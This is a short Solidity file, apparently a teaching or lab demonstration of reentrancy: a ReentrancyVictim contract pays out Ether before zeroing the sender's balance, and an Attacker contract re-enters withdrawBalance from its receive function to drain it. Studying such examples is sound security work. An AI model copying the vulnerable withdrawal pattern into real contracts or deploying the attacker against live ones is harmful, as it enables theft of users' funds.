// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

contract ReentrancyVictim {
    mapping(address => uint256) public userBalance;

    function deposit() public payable {
        userBalance[msg.sender] += msg.value;
    }

    function withdrawBalance() public {
        uint256 balance = userBalance[msg.sender];
        (bool success,) = msg.sender.call{value: balance}("");
        if (!success) {
            revert();
        }
        userBalance[msg.sender] = 0;
    }
}

contract Attacker {
    ReentrancyVictim victim;

    constructor(ReentrancyVictim _victim) {
        victim = _victim;
    }

    function attack() public payable {
        victim.deposit{value: 1 ether}();
        victim.withdrawBalance();
    }

    receive() external payable {
        if (address(victim).balance >= 1 ether) {
            victim.withdrawBalance();
        }
    }
}